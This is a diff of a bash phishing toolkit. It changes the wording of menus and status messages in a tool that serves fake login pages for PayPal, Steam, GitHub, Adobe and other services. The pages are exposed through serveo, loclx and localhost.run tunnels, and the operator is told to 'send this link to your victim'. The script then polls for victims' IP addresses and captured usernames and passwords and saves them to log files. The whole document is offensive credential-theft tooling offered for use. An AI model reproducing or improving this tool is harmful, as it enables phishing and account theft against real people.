@@ -122,7 +122,7 @@ printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[0m\e[96m Paypal      \e[0
 printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[0m\e[96m Steam       \e[0m\e[1;31m[\e[0m\e[1;77m17\e[0m\e[1;31m]\e[0m\e[0m\e[96m Protonmail\e[0m\n"         
 printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[0m\e[96m Twitter     \e[0m\e[1;31m[\e[0m\e[1;77m18\e[0m\e[1;31m]\e[0m\e[0m\e[96m Spotify     \e[0m\e[1;31m[\e[0m\e[1;77m99\e[0m\e[1;31m]\e[0m\e[0m\e[96m About\e[0m\n"                              
 printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[0m\e[96m Playstation \e[0m\e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[0m\e[96m Reddit      \e[0m\e[1;31m[\e[0m\e[1;77m00\e[0m\e[1;31m]\e[0m\e[0m\e[96m Exit\e[0m\n"                 
-printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[0m\e[96m Github      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[0m\e[96m Adobe\e[0m\n" |lolcat   
+printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[0m\e[96m Github      \e[0m\e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[0m\e[96m Adobe\e[0m\n"   
 printf "\e[0m\n"
 echo -e "╭─[TECHNOCYBER]" |lolcat
 read -p "   ╰─root@2Timeowl=" menu_option
@@ -516,7 +516,7 @@ fi
 serveo_link=$(grep -o '.\{0,0\}http.\{0,100\}' .nexlink)
 smallbanner
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Send the link to victim :\e[0m\e[0m\e[96m %s \n" $serveo_link
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Send this link to your victim :\e[0m\e[0m\e[96m %s \n" $serveo_link
 
 datafound
 }
@@ -559,7 +559,7 @@ fi
 loclx_link=$(grep -o 'https://[0-9a-z]*\.loclx.io ' .nexlink)
 smallbanner
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[0m\e[96m %s \n" $loclx_link
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send this link to your victim :\e[0m\e[0m\e[96m %s \n" $loclx_link
 
 datafound
 }
@@ -582,13 +582,13 @@ ssh -R 80:localhost:4545 ssh.localhost.run
 printf "\e[0m\n"
 
 printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[0m\e[96m Login Info \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\e[0m\e[96m Login Credentials \e[1;31m[\e[0m\e[1;77m::\e[0m\e[1;31m]\e[0m\n"
 printf "\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e ".htr/www/ip.txt" ]]; then
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Ip of Victim Found !\e[0m\n"
 grab_ip
 rm -rf .htr/www/ip.txt
 fi
@@ -639,28 +639,28 @@ cat .htr/www/usernames.txt >> logs/$website.log
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[0m\e[96m logs/%s.log\e[0m\n" $website
 printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[0m\e[96m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[0m\e[96m Waiting for Next Credentials,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
 
 }
 
 datafound() {
 
 printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[0m\e[96m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[0m\e[96m Waiting for Credentials,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
 printf "\n"
 while [ true ]; do
 
 
 if [[ -e ".htr/www/ip.txt" ]]; then
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Ip of Victim Found !\e[0m\n"
 grab_ip
 rm -rf .htr/www/ip.txt
 fi
 sleep 0.75
 if [[ -e ".htr/www/usernames.txt" ]]; then
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\e[0m\n"
 grab_creds
 rm -rf .htr/www/usernames.txt
 fi
